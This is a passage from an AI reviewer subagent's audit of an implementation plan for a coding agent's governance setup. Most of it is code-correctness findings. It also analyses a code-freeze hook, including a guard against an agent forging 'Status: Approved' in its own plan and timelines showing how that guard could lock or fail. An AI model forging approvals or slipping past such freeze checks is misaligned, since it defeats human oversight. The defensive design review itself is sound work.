                                                                                                                             |

---

## Audit History

### Audit Run 1

[REVIEWER_MODEL: gemini-4-argon]

- **Reviewer**: Subagent `@reviewer` (`gemini-4-argon`, thinking budget Max)
- **Ngày**: 2026-10-19
- **Đối tượng thẩm định**: Revision 1 (`docs/plans/2026-10-19-remake-agents-governance-v2-implementation-plan.md`)
- **Kết quả**: `[CHANGES_REQUESTED]` (1 `[BLOCKER]`, 3 `[MAJOR]`, 1 `[MINOR]`)

---

#### 1. Kiểm Chứng Lỗi Cũ

- Không áp dụng (đây là lượt thẩm định đầu tiên — Audit Run 1 trên Revision 1).

---

#### 2. Phát Hiện Mới (New Findings)

##### `[BLOCKER]` `BLK-01`: Sai lệch hợp đồng API `decide()`, tên hằng số `UNFROZEN_PREFIXES`, và hệ thống module ESM trong `.agents/scripts/code-freeze-guard.js` & `.agents/scripts/code-freeze-guard.test.ts`

- **Vị trí trong kế hoạch**: Mục 4 (dòng 135), Mục 6.1–6.3 (dòng 198–336), Mục 7 Bước 4 (dòng 405–410), Mục 8 (`TC-04`, `TC-05`), Mục 9.3 (`Negative Probe 3`, `Negative Probe 4`).
- **Bằng chứng trên mã nguồn thật (`[SRC]`)**:
  1. **Sử dụng hằng số không tồn tại `ALWAYS_UNFROZEN_PREFIXES` và làm mất `UNFROZEN_FILES`**:
     - Tại Mục 6.2 (dòng 253–257), kế hoạch viết:
       `const unfrozen = ALWAYS_UNFROZEN_PREFIXES.some((prefix) => relative === prefix.replace(/\/$/, "") || relative.startsWith(prefix));`
     - Đối chiếu `[SRC]` `.agents/scripts/code-freeze-guard.js:39-42,464-470`: mã nguồn thực tế định nghĩa `const UNFROZEN_PREFIXES = ["docs/"];` và `const UNFROZEN_FILES = ["implementation_plan.md", "task.md", "walkthrough.md"];`, đồng thời kiểm tra:
       `const unfrozen = UNFROZEN_PREFIXES.some((prefix) => relative.startsWith(prefix)) || UNFROZEN_FILES.includes(relative);`
     - Việc dùng `ALWAYS_UNFROZEN_PREFIXES` sẽ làm `npm run type-check` báo lỗi `TS2304: Cannot find name 'ALWAYS_UNFROZEN_PREFIXES'` (do dòng 1 của `code-freeze-guard.js` bật `// @ts-check`), ném `ReferenceError` tại runtime ở mọi thao tác ghi file, và việc bỏ `UNFROZEN_FILES.includes(relative)` làm hỏng unit test hiện hữu `"allows root planning artifacts"` tại `[SRC]` `.agents/scripts/code-freeze-guard.test.ts:115-117`.
  2. **Truyền sai thuộc tính `filePath` (thay vì `targetFile`) và tham số thứ hai `false` (thay vì `{ planApproved: false }`) khi gọi `decide()`**:
     - Tại Mục 6.3 (dòng 311–335), Mục 8 (`TC-04`, `TC-05`) và Mục 9.3 (`Negative Probe 3`, `Negative Probe 4`), kế hoạch gọi `decide({ toolName: "write_to_file", filePath: "...", newContent: "..." }, false)`.
     - Đối chiếu `[SRC]` `.agents/scripts/code-freeze-guard.js:28-29,437,443,542` và `.agents/scripts/code-freeze-guard.test.ts:111-145,974-985`:
       - Kiểu `GuardInput` sử dụng trường `targetFile?: string` (`if (input.targetFile)` tại dòng 443), **không có** trường `filePath`.
       - Tham số thứ hai của `decide(input, options = {})` là object `DecideOptions` (`{ planApproved?: boolean }`), **không phải** `boolean`.
     - Hệ quả thực thi: khi truyền `filePath`, `input.targetFile` là `undefined`, khiến `decide()` bỏ qua toàn bộ nhánh kiểm tra file (dòng 443–554) và rơi thẳng xuống câu lệnh fail-closed cuối hàm tại dòng 597 (`"⚠️ Code Freeze Guard: tool call carries no recognisable target — failing closed."`). Do đó:
       - Test case dương tính tại Mục 6.3 (dòng 324–335) sẽ trả về `"ask"` thay vì `"allow"` ➔ test **FAIL**.
       - Test case âm tính tại Mục 6.3 (dòng 311–322) sẽ trả về `reason` của dòng 597 thay vì `"Plan Self-Forgery Guard"` ➔ `expect(res.reason).toContain("Plan Self-Forgery Guard")` **FAIL**.
       - `npm run type-check` (`tsc --noEmit`) sẽ **FAIL** với lỗi `TS2353` (`'filePath' does not exist in type 'GuardInput'`) và `TS2345` (`Argument of type 'boolean' is not assignable to parameter of type 'DecideOptions'`).
  3. **Nhầm lẫn hệ thống module CommonJS vs ES Module**:
     - Tại Mục 4 (dòng 135), kế hoạch ghi `code-freeze-guard.js dùng CommonJS (require/module.exports)` và tại Mục 7 Bước 4.5 (dòng 408) yêu cầu _"Export thêm `evaluatePlanApprovalContent` và `isSelfForgedPlanWrite` trong `module.exports` (dòng 715–725)"_.
     - Đối chiếu `[SRC]` `.agents/scripts/code-freeze-guard.js:21-25,33,94,176,437,715-726`: file này viết bằng **ES Module (`import` / `export function`)**, hoàn toàn không có `module.exports`.
- **Yêu cầu sửa trong Revision 2**:
  - Sửa Mục 4 (dòng 135), Mục 6.1 và Bước 4.5: dùng `export function evaluatePlanApprovalContent(content)` và `export function isSelfForgedPlanWrite(newContent)` theo chuẩn ESM; xóa hướng dẫn `module.exports`. Đồng bộ biểu thức chính quy kiểm tra Header giữa Mục 1.1 (dòng 31) và Mục 6.1 (dòng 205, 236) thành `/^(?:-\s*)?\*\*(?:Status|Trạng thái)\*\*:\s*Approved\s*$/im`.
  - Sửa Mục 6.2 và Bước 4.4: giữ nguyên `const unfrozen = UNFROZEN_PREFIXES.some((prefix) => relative.startsWith(prefix)) || UNFROZEN_FILES.includes(relative);` của `.agents/scripts/code-freeze-guard.js:465-467`, và đặt chốt chặn Self-Forgery Guard bên trong `if (unfrozen)` với điều kiện `relative.startsWith("docs/plans/") && input.toolName === "write_to_file" && isSelfForgedPlanWrite(input.newContent)`.
  - Sửa Mục 6.3, Mục 8 (`TC-04`, `TC-05`) và Mục 9.3 (`Negative Probe 3`, `Negative Probe 4`): đổi toàn bộ `filePath:` thành `targetFile:` (và bỏ `toolName: "run_command"` không cần thiết hoặc giữ đúng `{ command: "..." }`), đổi tham số thứ hai từ `false` thành `{ planApproved: false }`.

---

##### `[MAJOR]` `MAJ-01`: Nhầm lẫn cổng `[4/5]` và `[5/5]` của `scripts/verify-docs.mjs` & lỗi so khớp nghiêm ngặt `--expected-headings=100` làm `TC-07`/`TC-09` thất bại

- **Vị trí trong kế hoạch**: Mục 3.1.4 (dòng 111–112), Mục 8 (`TC-07`, `TC-09`), Mục 10 (`Risk 5`).
- **Bằng chứng trên mã nguồn thật (`[SRC]`)**:
  - Kế hoạch khẳng định tại Mục 3.1.4 (dòng 111) và `Risk 5` (dòng 485): _"Cổng `[4/5]` của `scripts/verify-docs.mjs` đếm tổng số dòng bắt đầu bằng `## ` trên cả 2 file `docs/CHANGELOG.md` và `docs/archive/CHANGELOG-legacy.md` cộng lại, mặc định so khớp với `expectedHeadings = 100` (hoặc `--expected-headings=<N>`), và cho phép `totalHeadings >= expectedHeadings`."_
  - Đối chiếu `[SRC]` `scripts/verify-docs.mjs:197-302`:
    1. Cổng **`[4/5]`** (`scripts/verify-docs.mjs:197-231`) là `Checking Governance Character Limits...` (kiểm tra `.agents/rules/*.md <= 12,000` và `.agents/agents/*/agent.md <= 10,000`).
    2. Cổng **`[5/5]`** (`scripts/verify-docs.mjs:233-296`) mới là `Checking CHANGELOG Size & Headings Integrity...`.
    3. Tại dòng 239 (`let expectedHeadings = null;`), script **không** có giá trị mặc định `100`. Khi truyền `--expected-headings=<N>`, dòng 274 kiểm tra **so sánh bằng nghiêm ngặt** (`if (totalHeadings !== expectedHeadings)`), **không phải** `>=`. Do tổng số heading hiện tại là `28 + 74 = 102` (và sau khi thêm 1 mục changelog của task này sẽ là `103`), nếu chạy lệnh với `--expected-headings=100`, cổng `[5/5]` sẽ báo lỗi `FAIL: Headings count mismatch! Expected 100, got 103` và thoát với `exit code 1`.
    4. Chuỗi kết thúc tại `[SRC]` `scripts/verify-docs.mjs:301` là `>>> ALL DOCUMENTATION VERIFICATION CHECKS PASSED. <<<` (không phải `🎉 ALL VERIFICATION CHECKS PASSED!` như ghi tại `TC-09`).
    5. Ngoài ra, `[SRC]` `docs/CHANGELOG.md:7` và `docs/archive/CHANGELOG-legacy.md:3` đang ghi mốc lưu trữ là `2026-09-10`; khi di chuyển các mục `<= 2026-10-15` (dòng 122–847) sang file archive, cần cập nhật dòng ghi chú mốc ngày này để tránh doc drift mới.
- **Yêu cầu sửa trong Revision 2**:
  - Cập nhật lại Mục 3.1.4, Mục 8 (`TC-07`, `TC-09`) và Mục 10 (`Risk 5`) đúng với `[SRC]` `scripts/verify-docs.mjs:197-302`: phân biệt đúng cổng `[4/5]` (Character Limits) và cổng `[5/5]` (CHANGELOG `< 35,000 bytes` & `--expected-headings=103`), sửa chuỗi output mong đợi trong `TC-09` thành `>>> ALL DOCUMENTATION VERIFICATION CHECKS PASSED. <<<`, và cập nhật ghi chú mốc ngày lưu trữ tại `docs/CHANGELOG.md:7` cùng `docs/archive/CHANGELOG-legacy.md:3`.

---

##### `[MAJOR]` `MAJ-02`: Sót tham chiếu `.agents/workflows/debug.md` tại dòng 140 của `.agents/rules/02-quality.md` và sót đường dẫn thiếu tiền tố `src/` trong `.agents/skills/add-model/SKILL.md`

- **Vị trí trong kế hoạch**: Mục 2.1 (dòng 66), Mục 5 (`#8` dòng 158, `#16` dòng 166), Mục 7 Bước 3 (dòng 378–381) & Bước 5 (dòng 419), Mục 10 (`Risk 3` dòng 483).
- **Bằng chứng trên mã nguồn thật (`[SRC]`)**:
  1. Trong `[SRC]` `.agents/rules/02-quality.md`, chuỗi `.agents/workflows/` xuất hiện tại **5 vị trí**: dòng 19 (`debug.md`), dòng 30 (`audit.md`), dòng 41 (`.agents/workflows/`), dòng 99 (`audit.md`), và **dòng 140** (`For any bug that is not trivially obvious, you MUST follow the debug workflow in .agents/workflows/debug.md.`). Kế hoạch tại Mục 2.1 (dòng 66), Bước 3 (dòng 378–381) và `Risk 3` (dòng 483) chỉ liệt kê dòng 19, 30, 41, 99 (và ghi lệch dòng 146), bỏ sót dòng 140. Khi cổng `[2/5]` của `scripts/verify-docs.mjs` bổ sung regex `/\.agents\/workflows\//`, bất kỳ tham chiếu sót nào ở dòng 140 sẽ làm `verify-docs.mjs` báo `FAIL`.
  2. Trong `[SRC]` `.agents/skills/add-model/SKILL.md`, ngoài lỗi `lib/utils/config.ts` ở dòng 37, còn có **dòng 12** (`File: lib/core/modelRegistry.ts`) và **dòng 28** (`against lib/core/modelRegistry.ts`) bị thiếu tiền tố `src/` (mâu thuẫn với dòng 3 frontmatter `src/lib/core/modelRegistry.ts` và quy chuẩn đường dẫn từ repo root tại `.agents/rules/02-quality.md:116`). Tương tự, `[SRC]` `.agents/skills/add-translation/SKILL.md:12,25,31` vẫn ghi `lib/utils/translations/` thiếu `src/`.
- **Yêu cầu sửa trong Revision 2**:
  - Tại Mục 2.1, Bước 3 và `Risk 3`: liệt kê đầy đủ cả 5 vị trí tham chiếu `.agents/workflows/` trong `.agents/rules/02-quality.md` (dòng 19, 30, 41, 99, 140) cần chuyển sang `.agents/skills/vikini-debug/SKILL.md` và `.agents/skills/vikini-audit/SKILL.md`.
  - Tại Mục 5 (`#16`) và Bước 5: bổ sung sửa `lib/core/modelRegistry.ts` ➔ `src/lib/core/modelRegistry.ts` tại dòng 12 và dòng 28 của `.agents/skills/add-model/SKILL.md` (và chuẩn hóa `lib/utils/translations/` ➔ `src/lib/utils/translations/` trong `.agents/skills/add-translation/SKILL.md:12,25,31`).

---

##### `[MAJOR]` `MAJ-03`: Mâu thuẫn tự thân trong `.agents/agents/reviewer/evidence-bar.md` §4.5.3 khi thay thế Negative Probe và thiếu kiểm soát thứ tự `mtimeMs` khi đóng trạng thái `Completed` cho các file kế hoạch

- **Vị trí trong kế hoạch**: Mục 3.2 (dòng 120), Mục 5 (`#5` dòng 155, danh sách `[MODIFY]`), Mục 7 Bước 2 (dòng 361–362) & Bước 5 (dòng 422).
- **Bằng chứng trên mã nguồn thật (`[SRC]`)**:
  1. Tại `[SRC]` `.agents/agents/reviewer/evidence-bar.md:48-51` (§4.5.3 `Enforcement Claim Verification`):
     - Dòng 48–49 yêu cầu **Negative Probe** (chứng minh công cụ bắt lỗi trên input vi phạm).
     - Dòng 50 quy định rõ: _'"Chạy sạch trên codebase hiện tại" CHỈ chứng minh trạng thái hiện tại sạch, KHÔNG chứng minh rule hoạt động → tự nó KHÔNG đủ cho PASS.'_
     - Việc Mục 5 `#5` (dòng 155) đề xuất thay ví dụ Negative Probe ở dòng 49 bằng `npx tsc --noEmit` (vốn chỉ chạy trên codebase hiện tại) khiến dòng 49 và dòng 50 của `evidence-bar.md` tự mâu thuẫn trực tiếp với nhau.
  2. Tại Mục 3.2 (dòng 120) và Bước 5 (dòng 422), kế hoạch chỉ định cập nhật `- **Status**: Completed` cho cả `docs/plans/2026-10-19-vitest-upgrade-and-add-model-skill.md` và `docs/plans/2026-10-19-remake-agents-governance-v2-implementation-plan.md`, nhưng:
     - File `docs/plans/2026-10-19-vitest-upgrade-and-add-model-skill.md` và `docs/plans/README.md` chưa được liệt kê trong Mục 5 (`[MODIFY]`). (Ngoài ra mục `#22` gộp 2 file `docs/CHANGELOG.md` và `docs/archive/CHANGELOG-legacy.md` vào 1 dòng khiến tổng số file thực tế lệch với con số `22 files`).
     - Theo `[SRC]` `.agents/scripts/code-freeze-guard.js:201-205`, `isPlanApproved()` sắp xếp `docs/plans/*.md` theo `fs.statSync(b).mtimeMs - fs.statSync(a).mtimeMs` và chỉ kiểm tra duy nhất `entries[0]`. Nếu trong quá trình thực thi, Implementer cập nhật `2026-10-19-vitest-upgrade-and-add-model-skill.md` sang `Status: Completed` trước khi hoàn tất sửa các file khác, file đó sẽ có `mtimeMs` mới nhất và lập tức khóa Code Freeze Guard giữa chừng.
- **Yêu cầu sửa trong Revision 2**:
  - Tại Mục 5 `#5` và Bước 2: quy định rõ trong `.agents/agents/reviewer/evidence-bar.md` §4.5.1 & §4.5.3 rằng `npx tsc --showConfig`, `npx tsc --noEmit`, `npx eslint --print-config <path>` là công cụ kiểm chứng **Wiring & Baseline**, còn **Negative Probe** hợp lệ với Code Freeze Guard là: (a) các test case âm tính truyền dữ liệu/lệnh vi phạm trong file unit test co-located (`*.test.ts`) thực thi qua `npx vitest run <path>`, hoặc (b) bước Negative Probe được định nghĩa tường minh trong mục Verification Plan / Test Contract của kế hoạch.
  - Bổ sung `docs/plans/2026-10-19-vitest-upgrade-and-add-model-skill.md` và `docs/plans/README.md` (cập nhật bảng trạng thái kế hoạch) vào danh sách `[MODIFY]` tại Mục 5 (tách riêng từng file để số lượng khớp chính xác), và ghi rõ tại Bước 5: thao tác đổi `- **Status**: Completed` chỉ thực hiện ở **bước cuối cùng** sau khi toàn bộ các bước chỉnh sửa và lệnh verify đã hoàn tất (cập nhật `2026-10-19-vitest-upgrade-and-add-model-skill.md` trước, sau đó cập nhật `2026-10-19-remake-agents-governance-v2-implementation-plan.md` cuối cùng).

---

##### `[MINOR]` `MIN-01`: Lệch thông tin phiên bản và số dòng trong Bảng Verified Versions (Mục 4) & Mục 3.2 so với `package.json` và `docs/CHANGELOG.md` thực tế

- **Vị trí trong kế hoạch**: Mục 3.2 (dòng 119), Mục 4 (dòng 132–135).
- **Bằng chứng trên mã nguồn thật (`[SRC]`)**:
  - Mục 4 (dòng 132–135) ghi: `Vitest ^4.1.4 (package.json:103)`, `TypeScript ^5.9.3 (package.json:100)`, `ESLint ^9.39.4 (package.json:89)`, `Node 22+ LTS`.
  - Đối chiếu `[SRC]` `package.json:101,115,117,120`: thực tế là `"vitest": "^4.1.12"` (dòng 117), `"typescript": "^5.9.3"` (dòng 115), `"eslint": "^9.39.2"` (dòng 101), và `"node": "24.x"` (dòng 120).
  - Mục 3.2 (dòng 119) ghi tiêu đề mục đầu `docs/CHANGELOG.md` là `## 2026-10-19 — Upgrade Vitest v4.1.4 & Create add-model Skill (docs/CHANGELOG.md:9-46)`, trong khi `[SRC]` `docs/CHANGELOG.md:11-19` thực tế là `## 2026-10-19: Maintenance -- Vitest 4.1.12 & add-model SKILL.md` (dòng 11–19).
- **Yêu cầu sửa trong Revision 2**: Cập nhật chính xác phiên bản và số dòng tại Mục 3.2 và Mục 4 khớp với `package.json` và `docs/CHANGELOG.md` hiện hành.

---

#### 3. Plan Completeness Gate & Mental Simulation Verification Matrix

##### 3.1. Plan Completeness Gate (7 Hạng Mục Bắt Buộc)

|  #  | Hạng Mục Cấu Trúc                               | Trạng Thái |  Loại Bằng Chứng  | Chi Tiết Kiểm Chứng                                                                                                                                                                                    |
| :-: | :---------------------------------------------- | :--------: | :---------------: | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|  1  | **Bảng Verified Versions (2026)**               |   `FAIL`   | `[SRC]` / `[URL]` | Có bảng tại Mục 4 kèm `[URL]` Antigravity docs 2026, nhưng sai hệ thống module của `code-freeze-guard.js` (ghi CommonJS thay vì ESM — `BLK-01`) và lệch version/line trong `package.json` (`MIN-01`).  |
|  2  | **Checklist `[NEW]` / `[MODIFY]` / `[DELETE]`** |   `FAIL`   |      `[SRC]`      | Thiếu liệt kê `.agents/skills/add-translation/SKILL.md`, `docs/plans/2026-10-19-vitest-upgrade-and-add-model-skill.md`, `docs/plans/README.md` và gộp 2 file changelog vào 1 mục (`MAJ-02`, `MAJ-03`). |
|  3  | **Verification Plan & Probes**                  |   `FAIL`   |      `[SRC]`      | `Negative Probe 3` và `Negative Probe 4` tại Mục 9.3 truyền sai `filePath` và tham số `false` cho `decide()` (`BLK-01`).                                                                               |
|  4  | **Test Contract**                               |   `FAIL`   |      `[SRC]`      | `TC-04`, `TC-05` sai chữ ký `decide()`; `TC-07`, `TC-09` sai cổng `[4/5]` vs `[5/5]`, sai hành vi `--expected-headings=100` và sai chuỗi output của `scripts/verify-docs.mjs` (`BLK-01`, `MAJ-01`).    |
|  5  | **Assumptions & Cross-Task Dependencies**       |   `FAIL`   | `[SRC]` / `[CMD]` | Giả định 3.1.4 mô tả sai cổng `[4/5]` và điều kiện `totalHeadings >= expectedHeadings` của `scripts/verify-docs.mjs:238-274` (`MAJ-01`).                                                               |
|  6  | **Out of Scope (`What We're NOT Doing`)**       |   `PASS`   |      `[SRC]`      | Định nghĩa rõ ràng tại Mục 1.2 (dòng 49–55), cô lập hoàn toàn `src/app/`, `src/lib/`, `src/components/`.                                                                                               |
|  7  | **Skills Loaded & Applied**                     |   `PASS`   |      `[SRC]`      | Đã nạp và ánh xạ 5 skills (`vikini-investigate`, `vikini-simplify`, `api-patterns`, `add-model`, `add-translation`) tại Mục 2.2 (dòng 86–95).                                                          |

##### 3.2. Mental Simulation Verification Matrix (S1–S6 + Domain)

| Kịch Bản                                         | Trạng Thái |  Loại Bằng Chứng  | Chi Tiết Kiểm Chứng Độc Lập                                                                                                                                                                                                                                                                                                                                                               |
| :----------------------------------------------- | :--------: | :---------------: | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **S1: Cold-start & Build**                       |   `FAIL`   | `[CMD]` / `[SRC]` | Baseline hiện tại: `npm run type-check` (`exit 0`), `npm run lint` (`exit 0`), `npx vitest run .agents/scripts/code-freeze-guard.test.ts` (`92/92 passed`). Tuy nhiên code sketch tại Mục 6.2–6.3 và Bước 4.5 dùng `ALWAYS_UNFROZEN_PREFIXES`, `module.exports`, `filePath`, và tham số `false` sẽ làm vỡ `npm run type-check` (`TS2304`, `TS2353`, `TS2345`) và vỡ unit test (`BLK-01`). |
| **S2: Runner Lifecycle & Teardown**              |   `PASS`   |      `[SRC]`      | Không chạm tới SSE stream hay kết nối DB/Redis (`src/` thuộc Out of Scope). Thiết kế tách hàm thuần `evaluatePlanApprovalContent(content)` và `isSelfForgedPlanWrite(newContent)` giúp kiểm thử in-memory cô lập mà không cần ghi file tạm ra `docs/plans/`.                                                                                                                              |
| **S3: Database & Temporal Logic**                |   `FAIL`   | `[SRC]` / `[ADV]` | Không chạm DB/migrations, nhưng cơ chế sắp xếp theo thời gian `mtimeMs` trong `isPlanApproved()` (`.agents/scripts/code-freeze-guard.js:201-205`) có rủi ro khóa repo sớm nếu cập nhật `2026-10-19-vitest-upgrade-and-add-model-skill.md` sang `Completed` sai thứ tự (`MAJ-03`).                                                                                                         |
| **S4: Cross-Task State Flow**                    |   `FAIL`   | `[CMD]` / `[SRC]` | Đối chiếu `[CMD]` `git status` và `[SRC]` `.agents/skills/add-model/SKILL.md:12,28,37`: kế hoạch phát hiện lỗi ở dòng 37 nhưng bỏ sót `lib/core/modelRegistry.ts` thiếu `src/` ở dòng 12, 28 (`MAJ-02`) và lệch thông tin version Vitest `4.1.12` từ task trước (`MIN-01`).                                                                                                               |
| **S5: Security Boundary & Guard Enforcement**    |   `FAIL`   | `[SRC]` / `[ADV]` | Lỗi truyền `filePath` thay vì `targetFile` trong test Self-Forgery Guard (Mục 6.3 dòng 311–322) khiến `decide()` không đi vào Gate 3 mà rơi xuống fail-closed dòng 597, tạo nguy cơ test giả dương tính cho `decision === "ask"` và làm trượt kiểm tra `reason` (`BLK-01`).                                                                                                               |
| **S6: External Resilience & Serverless Cap**     |   `PASS`   | `[SRC]` / `[URL]` | Không thay đổi API routes. Cấu hình `.agents/hooks.json` giữ nguyên `"timeout": 5` (5 giây) và `.agents/scripts/code-freeze-guard.js:709-718` có khối `try / catch` đồng bộ đảm bảo fail-closed (`decision: "ask"`) nếu payload stdin bị lỗi.                                                                                                                                             |
| **Domain: Vikini Governance 2.0 & Verification** |   `FAIL`   | `[SRC]` / `[URL]` | Sót tham chiếu `.agents/workflows/debug.md` tại `.agents/rules/02-quality.md:140` (`MAJ-02`), nhầm cổng `[4/5]` vs `[5/5]` và lỗi `--expected-headings=100` trong `scripts/verify-docs.mjs:274` (`MAJ-01`), và mâu thuẫn Negative Probe trong `evidence-bar.md:49-50` (`MAJ-03`).                                                                                                         |

---

#### 4. Claim Verification & Adversarial Timelines

##### 4.1. Kiểm Chứng Tài Liệu Chính Thức & Thư Viện (`[URL]` / `[SRC]`)

- **Antigravity Subagents Schema (`[URL]` `https://antigravity.google/docs/subagents.md`)**: Xác nhận YAML frontmatter chuẩn hỗ trợ `name`, `description`, `tools`, `mainAgent`, `subagent`, `model` (`inherit` | `flash` | `pro`), `commandExecutionPolicy`, `mcpServers`, `skills`/`plugins`. Không có trường `role:`. Phần thân Markdown bên dưới `---` được nạp trực tiếp làm system prompt của subagent. Các công cụ `view_file`, `replace_file_content`, `grep_search`, `run_command` nằm trong danh sách hợp lệ.
- **Antigravity Rules Schema (`[URL]` `https://antigravity.google/docs/rules.md`)**: Xác nhận `trigger: glob` yêu cầu trường `globs: "*.ts, *.tsx, *.js, *.mjs"` đặt trong dấu ngoặc kép khi bắt đầu bằng `*`. Giới hạn mỗi file rule là `24,000 bytes` và ngân sách `always_on` toàn cục là `20,000 tokens`.
- **Antigravity Hooks Schema (`[URL]` `https://antigravity.google/docs/hooks.md`)**: Xác nhận sự kiện `PreToolUse` hỗ trợ regex `matcher` khớp tên công cụ `write_to_file|replace_file_content|multi_replace_file_content|run_command`.
- **API Auth Pattern (`[SRC]` `src/app/api/conversations/auth.ts:25` & `.agents/skills/api-patterns/SKILL.md:49-50`)**: Xác nhận `requireUser()` chỉ là helper nội bộ cho `/api/conversations/**`, trong khi chuẩn chung toàn dự án là `const session = await auth(); if (!session?.user) throw new UnauthorizedError();`.

##### 4.2. Adversarial Timelines (4 Trục Đối Kháng — `evidence-bar.md` §4.5.2)

1. **Trục 1 — Đồng thời (Concurrent Hook Invocations)**:
   ```text
   Cơ chế: PreToolUse Hook (.agents/scripts/code-freeze-guard.js)
   T1: Agent gọi song song 2 tool calls (ví dụ replace_file_content trên 2 file) | T2: Antigravity spawn 2 tiến trình node scripts/code-freeze-guard.js độc lập | T3: Mỗi tiến trình đọc đồng bộ (fs.readFileSync) file plan mới nhất trong docs/plans/ mà không ghi trạng thái ra đĩa
   Kết cục: Không có race condition ghi file trong guard → AN TOÀN
   ```
2. **Trục 2 — Khoảng trống Check→Use / TOCTOU & Temporal Ordering (`isPlanApproved` `mtimeMs` Preemption)**:
   ```text
   Cơ chế: isPlanApproved() sắp xếp docs/plans/*.md theo mtimeMs giảm dần (.agents/scripts/code-freeze-guard.js:201-205)
   T1: Plan hiện tại (2026-10-19-remake-agents-governance-v2-implementation-plan.md) được duyệt với Status: Approved (mtimeMs = T1) | T2: Giữa quá trình thực thi Step 5, Agent sửa file plan cũ (2026-10-19-vitest-upgrade-and-add-model-skill.md) thành Status: Completed (mtimeMs = T2 > T1) | T3: Ở tool call tiếp theo, isPlanApproved() lấy entries[0] là file plan cũ vừa sửa (mtimeMs = T2), thấy Status: Completed nên trả về false
   Kết cục: Repo bị khóa (freeze) ngay giữa chừng khi chưa sửa xong các file còn lại → LỖI (MAJ-03 — bắt buộc quy định chỉ đổi Status: Completed ở bước cuối cùng và chạm file plan hiện tại sau cùng)
   ```
3. **Trục 3 — Thất bại giữa chừng & Fail-Closed Guard (`decide()` ReferenceError / Missing `targetFile`)**:
   ```text
   Cơ chế: Gate 3 Self-Forgery Guard trong decide() (.agents/scripts/code-freeze-guard.js:464-470)
   T1: Áp dụng code sketch Mục 6.2 (dùng ALWAYS_UNFROZEN_PREFIXES chưa khai báo) và test Mục 6.3 (truyền filePath thay vì targetFile) | T2: Khi chạy thật, ALWAYS_UNFROZEN_PREFIXES ném ReferenceError vào catch của main() (dòng 711); khi chạy test Mục 6.3, input.targetFile === undefined nên decide() nhảy thẳng tới dòng 597 | T3: Mọi lệnh ghi hợp lệ vào docs/plans/ bị chặn ask do ReferenceError, còn unit test Mục 6.3 thất bại cả nhánh allow lẫn kiểm tra reason
   Kết cục: Vỡ runtime guard và vỡ bộ unit test → LỖI (BLK-01)
   ```
4. **Trục 4 — Môi trường Serverless / Stateless Process**:
   - `N/A` cho runtime Vercel Serverless vì task này hoàn toàn không chạm vào `src/app/api/**` hay `src/lib/**`. Ở tầng CLI hook local, mỗi lần gọi `code-freeze-guard.js` là một tiến trình Node.js stateless ngắn hạn (`timeout: 5s`), không phụ thuộc bộ nhớ chia sẻ giữa các lần gọi.

---

#### 5. Commands Executed & Dismissed Findings

##### 5.1. Commands Executed (Trong ALLOWLIST)

1. `npm run type-check` ➔ **Exit code 0** (`tsc --noEmit` sạch lỗi).
2. `npx vitest run .agents/scripts/code-freeze-guard.test.ts` ➔ **Exit code 0** (`1 passed`, `92/92 tests passed`).
3. `git status` ➔ **Exit code 0** (xác nhận các file uncommitted từ task trước: `.agents/skills/README.md`, `.agents/skills/add-model/`, `.gitignore`, `docs/CHANGELOG.md`, `package.json`, `package-lock.json`).
4. `npm run lint` ➔ **Exit code 0** (`eslint .` sạch lỗi).

##### 5.2. Dismissed Findings (Các Nghi Vấn Đã Kiểm Chứng Và Loại Bỏ)

- **Nghi vấn 1: Xóa `grep_search`, `list_dir`, `find_by_name` khỏi `tools:` của Subagents**:
  - Đã kiểm chứng `[URL]` `https://antigravity.google/docs/subagents.md` (dòng 54, 78): `grep_search` được liệt kê chính thức trong tài liệu Subagents 2026; kế hoạch giữ nguyên `view_file`, `list_dir`, `grep_search`, `find_by_name` là chính xác, loại bỏ nghi vấn.
- **Nghi vấn 2: Cổng `[1/5]` của `scripts/verify-docs.mjs` có bị gãy link bởi các file kế hoạch lịch sử trong `docs/plans/` không?**:
  - Đã kiểm chứng `[SRC]` `scripts/verify-docs.mjs:37-42`: cổng `[1/5]` đã có sẵn bộ lọc `if (rel.startsWith("docs/plans/") && rel !== "docs/plans/README.md") return false;`, nên các liên kết lịch sử tới `.agents/workflows/` trong các bản kế hoạch cũ không làm gãy `[1/5]`.

---

#### 6. Kết Luận & Yêu Cầu Hành Động Cho Planner (Revision 2)

Kế hoạch có định hướng kiến trúc tốt nhưng chứa **1 lỗi `[BLOCKER]` (`BLK-01`)**, **3 lỗi `[MAJOR]` (`MAJ-01`, `MAJ-02`, `MAJ-03`)**, và **1 lỗi `[MINOR]` (`MIN-01`)** cần được khắc phục hoàn toàn trong **Revision 2**:

1. **`BLK-01`**: Sửa Mục 4, Mục 6.1–6.3, Mục 7 Bước 4, Mục 8 (`TC-04`, `TC-05`) và Mục 9.3 (`Negative Probe 3`, `Negative Probe 4`) để dùng đúng `UNFROZEN_PREFIXES` + `UNFROZEN_FILES`, đúng thuộc tính `targetFile` và tham số `{ planApproved: false }` của `decide()`, và dùng cú pháp ESM `export function` thay vì `module.exports`.
2. **`MAJ-01`**: Sửa Mục 3.1.4, Mục 8 (`TC-07`, `TC-09`) và Mục 10 (`Risk 5`) khớp với `[SRC]` `scripts/verify-docs.mjs:197-302` (phân biệt đúng cổng `[4/5]` Character Limits và cổng `[5/5]` CHANGELOG Size & Headings, dùng `--expected-headings=103` hoặc cập nhật logic so sánh trong `verify-docs.mjs`, sửa chuỗi thông báo `>>> ALL DOCUMENTATION VERIFICATION CHECKS PASSED. <<<`, và cập nhật ngày lưu trữ tại `docs/CHANGELOG.md:7` & `docs/archive/CHANGELOG-legacy.md:3`).
3. **`MAJ-02`**: Bổ sung thay thế tham chiếu `.agents/workflows/debug.md` tại dòng 140 của `.agents/rules/02-quality.md`, và sửa `lib/core/modelRegistry.ts` ➔ `src/lib/core/modelRegistry.ts` tại dòng 12, 28 của `.agents/skills/add-model/SKILL.md` (cùng `src/lib/utils/translations/` trong `.agents/skills/add-translation/SKILL.md:12,25,31`).
